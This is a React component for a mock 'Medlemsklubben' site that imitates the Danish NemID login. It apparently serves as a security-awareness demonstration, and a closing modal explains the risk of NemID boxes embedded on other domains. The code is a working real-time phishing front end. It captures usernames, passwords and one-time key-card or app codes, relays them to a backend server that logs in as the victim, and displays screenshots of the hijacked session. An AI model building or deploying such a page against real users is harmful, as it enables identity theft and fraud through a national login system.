import React, { Component } from 'react';
import './NemIdLogin.css';
import Modal from './Modal';

const STEPS = {
  LOGIN: 'login',
  OTP_PAPKORT: 'otp_papkort',
  OTP_APP: 'otp_app'
};

function delay(ms) {
  return new Promise(resolve => {
    setTimeout(resolve, ms);
  });
}

// const HOST_NAME = 'https://medlemsklubben-dk.appspot.com';
const HOST_NAME = 'http://localhost:8080';

async function request({ path, body }) {
  const resp = await fetch(`${HOST_NAME}${path}`, {
    method: 'post',
    body: JSON.stringify(body),
    headers: {
      Accept: 'application/json',
      'Content-Type': 'application/json'
    }
  });

  if (!resp.ok) {
    console.log('An error occured:', resp.status);
    throw new Error(resp.status);
  }

  return await resp.json();
}

class NemIdLogin extends Component {
  state = {
    isLoading: true,
    step: STEPS.LOGIN,
    isModalVisible: false,
    isScreenshotsVisible: false,

    // inputs
    username: '',
    password: '',
    otpResponseCode: '',

    // http responses
    id: null,
    waitingForAppAck: false,
    unreadMessages: 0,
    otpRequestCode: null
  };

  showScreenshots = e => {
    e.preventDefault();
    this.setState({ isScreenshotsVisible: true });
  };

  onMonitorScreenshots = e => {
    e.preventDefault();
    this.setState({ isMonitorScreenshotsVisible: true });
    this.monitorScreenshots();
  }

  closeModal = () => {
    this.setState({ isModalVisible: false });
  };

  onChangeUsername = e => {
    this.setState({ username: e.target.value });
  };

  onChangePassword = e => {
    this.setState({ password: e.target.value });
  };

  onChangeOtpResponseCode = e => {
    this.setState({ otpResponseCode: e.target.value });
  };

  submitLogin = async (username, password) => {
    const { id } = await request({
      path: '/start',
      body: { username, password }
    });

    this.setState({
      id,
      isLoading: true
    });

    try {
      await this.poll(id);
    } catch (e) {
      console.log('An error occured', e);
    }
  };

  monitorScreenshots = async () => {
    let id = this.state.id;
    let screenshotUrl = `/screenshot?id=${id}&cb=${Date.now()}`
    this.setState({ screenshotUrl });
    await delay(1000);
    return this.monitorScreenshots();
  }

  poll = async id => {
    const resp = await request({ path: '/poll', body: { id } });
    const { unreadMessages, otpRequestCode, waitingForAppAck, loginError } = await resp;
    if (unreadMessages != null) {
      this.setState({ unreadMessages, isModalVisible: true, isLoading: false });
      return;
    }

    if (this.state.step === STEPS.LOGIN) {
      if (otpRequestCode != null) {
        this.setState({
          otpRequestCode,
          step: STEPS.OTP_PAPKORT,
          isLoading: false
        });
      } else if (loginError) {
        this.setState({
          loginError,
          isLoading: false
        });
      } else if (waitingForAppAck) {
        this.setState({
          step: STEPS.OTP_APP,
          isLoading: false
        });
      }
    }

    await delay(1000);
    return this.poll(id);
  };

  onSubmitLogin = e => {
    e.preventDefault();
    this.setState({
      isLoading: true
    });

    this.submitLogin(this.state.username, this.state.password).catch(e => {
      console.log('An error occured', e);
    });
  };

  onSubmitResponseCode = e => {
    e.preventDefault();
    this.setState({
      isLoading: true
    });

    this.submitResponseCode(this.state.id, this.state.otpResponseCode).catch(
      e => {
        console.log('An error occured', e);
      }
    );
  };

  submitResponseCode = async (id, otpResponseCode) => {
    await request({ path: '/responseCode', body: { id, otpResponseCode } });
  };

  getContentForStep = step => {
    const stepLogin = (
      <form
        onSubmit={this.onSubmitLogin}
        className={`nemid-container ${
          this.state.isLoading ? 'is-loading' : ''
        }`}
      >
        <div className="loading-overlay">
          <div className="loading-indicator" />
        </div>

        <img className="nemid-logo" src="./nemid-logo.jpg" alt="Nemid logo" />

        <div className="site-name">Medlemsklubben</div>
        <div className="content-container">
          <div className="input-container">
            <div>Bruger-id</div>
            <div>
              <input
                autoFocus
                autoComplete="off"
                name="username"
                type="text"
                value={this.state.username}
                onChange={this.onChangeUsername}
              />
            </div>
          </div>

          <div className="input-container">
            <div>Adgangskode</div>
            <div>
              <input
                autoComplete="off"
                name="password"
                type="password"
                value={this.state.password}
                onChange={this.onChangePassword}
              />
            </div>
          </div>

          <div className="error">
            {this.state.loginError}
          </div>

          <div className="bottom">
            <div className="forgotten-password">Glemt adgangskode?</div>
            <input type="submit" value="Næste" className="submit-button" />
          </div>
        </div>
      </form>
    );

    const stepOtpApp = (
      <form
        className={`nemid-container ${
          this.state.isLoading ? 'is-loading' : ''
        }`}
      >
        <div className="loading-overlay">
          <div className="loading-indicator" />
        </div>

        <img className="nemid-logo" src="./nemid-logo.jpg" alt="Nemid logo" />

        <div className="content-container">
          <h6 className="header">Godkend på mobil/tablet</h6>

          <div className="icon-phone-container">
            <div className="icon-phone" />
          </div>

          <p>
            <br />
            Din anmodning er klar til godkendelse i dine nøgleapps på
            mobil/tablet.
          </p>

          <div className="bottom">
            <input type="button" value="Afbryd" className="submit-button" />
          </div>
        </div>
      </form>
    );

    const stepOtpPapkort = (
      <form
        onSubmit={this.onSubmitResponseCode}
        className={`nemid-container ${
          this.state.isLoading ? 'is-loading' : ''
        }`}
      >
        <div className="loading-overlay">
          <div className="loading-indicator" />
        </div>

        <img className="nemid-logo" src="./nemid-logo.jpg" alt="Nemid logo" />

        <div className="content-container papkort">
          <h6 className="header">Indtast nøgle</h6>
          <p>Nøglekort: S473-340-353</p>
          <table>
            <thead>
              <tr>
                <td className="icon-hash" />
                <td className="icon-key" />
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>{this.state.otpRequestCode}</td>
                <td>
                  <div className="input-container">
                    <input
                      autoFocus
                      maxLength="6"
                      className="otp-response-code"
                      type="tel"
                      onChange={this.onChangeOtpResponseCode}
                    />
                  </div>
                </td>
              </tr>
            </tbody>
          </table>

          <p>
            <br />
            Du har 89 nøgler tilbage
          </p>

          <input type="submit" value="Log på" className="submit-button" />
        </div>
      </form>
    );

    const stepLoggedIn = (
      <div>
        <h2>Velkommen</h2>
        <p>Vælg et vores mange gode tilbud herunder....</p>
        <p>i</p>
      </div>
    );

    switch (step) {
      case STEPS.LOGIN:
        return stepLogin;
      case STEPS.OTP_APP:
        return stepOtpApp;
      case STEPS.OTP_PAPKORT:
        return stepOtpPapkort;
      case STEPS.LOGGED_IN:
        return stepLoggedIn;
      default:
        return stepLogin;
    }
  };

  componentDidMount() {
    // Simulate a normal day at the NemID office...
    setTimeout(() => {
      this.setState({ isLoading: false });
    }, 1000);
  }

  render() {
    return (
      <div>
        <Modal
          content={
            <div>
              <h1>Sådan!</h1>
              <p>
                Du har {this.state.unreadMessages} ulæst(e) besked(er) i din
                E-Boks!
              </p>
              <p>
                Når du bruger NemId til at logge dig ind forskellige steder, er
                det umuligt for dig at vide, hvad websitet gør med dine
                loginoplysninger. Det er ikke kun suspekte websites du skal være
                påpasselig med. Troværdige danske virksomheder bliver også ofre
                for angreb, og hackere vil nemt kunne udskifte et officiel NemId
                Login med deres egen, der sender dem alle brugeres NemId login.
              </p>
              <p>
                Webservere kan logge sig ind som dig og underskrive som dig,
                uden at du kan se det. Denne demo webserver er lige nu ved at
                indsamle oplysninger om dig.
                <a onClick={this.showScreenshots}>Se skærmbilleder</a>.
                Med de informationer kan kriminelle
                optage lån i dit navn, afpresse dig...
              </p>
              <p>
                Problemet er ikke papkortet, men nærmere at
                NemID/Digitaliseringsstyrelsen tillader at indlejre NemID boksen
                på fremmede domæner, så du som bruger ikke kan sikre dig,
                at du kun giver dine login oplysninger til NemID.
              </p>
            </div>
          }
          closeModal={this.closeModal}
          isModalVisible={this.state.isModalVisible}
        />
        {this.getContentForStep(this.state.step)}
        <a onClick={this.onMonitorScreenshots}>Se hvad dit login i virkeligheden bliver brugt til.</a>
        {this.state.isMonitorScreenshotsVisible && this.state.screenshotUrl &&
          <div><img src={this.state.screenshotUrl} width="640" height="480"/></div>
        }
      </div>
    );
  }
}

export default NemIdLogin;
